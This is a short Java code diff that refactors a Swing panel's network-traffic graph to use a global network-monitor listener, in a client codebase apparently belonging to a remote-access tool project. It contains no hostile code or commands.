@@ -5,7 +5,7 @@ import java.awt.BorderLayout;
 import javax.swing.JPanel;
 import javax.swing.border.EmptyBorder;
 
-import se.jrat.client.listeners.NetworkMonitorListener;
+import se.jrat.client.listeners.GlobalNetworkMonitorListener;
 import se.jrat.client.threads.RunnableNetworkCounter;
 
 import com.redpois0n.graphs.network.NetworkColors;
@@ -25,7 +25,7 @@ public class PanelMainNetwork extends JPanel {
 	}
 
 	public void init() {
-		RunnableNetworkCounter.addListener(listener);
+		RunnableNetworkCounter.addGlobalListener(listener);
 
 		if (!initialized) {
 			initialized = true;
@@ -40,14 +40,10 @@ public class PanelMainNetwork extends JPanel {
 	}
 
 	public void setActive(boolean b) {
-		/*if (b) {
-			RunnableNetworkCounter.addListener(listener);
-		} else {
-			RunnableNetworkCounter.removeListener(listener);
-		}*/
+		
 	}
 	
-	class Listener implements NetworkMonitorListener {
+	class Listener implements GlobalNetworkMonitorListener {
 		@Override
 		public void onUpdate(int out, int in) {
 			graph.addValues(in, out);	
